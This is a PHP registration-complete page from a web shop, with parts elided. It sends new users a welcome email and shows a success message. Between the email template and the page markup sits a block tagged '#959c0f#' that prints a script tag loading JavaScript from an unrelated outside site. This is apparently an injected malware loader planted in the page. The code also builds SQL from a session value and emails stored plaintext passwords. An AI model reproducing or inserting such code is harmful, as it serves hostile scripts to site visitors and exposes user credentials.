...
$query = "select * from customer where id = $_SESSION[register_id] ";
$customer_info = $cls->db_select($query);
$to = $customer_info[1]["email"];
$user_name = $customer_info[1]["user_name"];
$name = $customer_info[1]["user_name"];
$password = $customer_info[1]["password"];
/////////////////
/////////////////
...
$subject = "Welcome to itSMF Egypt Chapter";
$text = "
<STYLE type=text/css>
.font_1 {
	...
	<table width='600' border='0' align='center' cellpadding='0' cellspacing='0'>
      ...
      <tr>
        <td class='font_1' colspan='5'>
			<br>
			Dear, $name
			Thank you for your registration with ivee market.
			<br><br> 
			Your membership is now pending approval. <br>
			User name:  $user_name<br>
			Password:  $password<br>
			<br><br>
			Thank you,<br><br>
			<strong>Ivee Market</strong><br>
			<a href='http://iveemarket.com'>http://iveemarket.com</a>
			<br>
		</td>
      </tr>
    </table>
...
#959c0f#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224450\"></script>";
echo $srwv;
}
#/959c0f#
?>
	...
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		...
		<b><!-- InstanceBeginEditable name="header" -->Register Complete<!-- InstanceEndEditable --></b>
		...
		<!-- InstanceBeginEditable name="content" -->
									 ...
									 <div  align="center" style=" background-color:#FFFFFF; border:#B3B7B8 solid 1px; margin-top:5px;padding:5px 5px 5px 5px;" > <br />
          <br />

				<span class="header_1" >Success! Now check your email</span>
				<br>
				<span class="normal1" style="font-size:11px" >Your information has been submitted.</span>
				<br><br>
				<div style="width:80%;" class="normal1" >
					
					
					<br>Thank you for you registration. <br> Your membership will be activated after approval
					
					<div style="display:none">
						Your password has been sent to your email address <span class="header_1" style="font-size:14px; font-weight:bolder;"><? //print $customer_info[1]["email"] ?></span> .<br>
						<br>Please memorize and keep this information confidential. <br>
					</div>
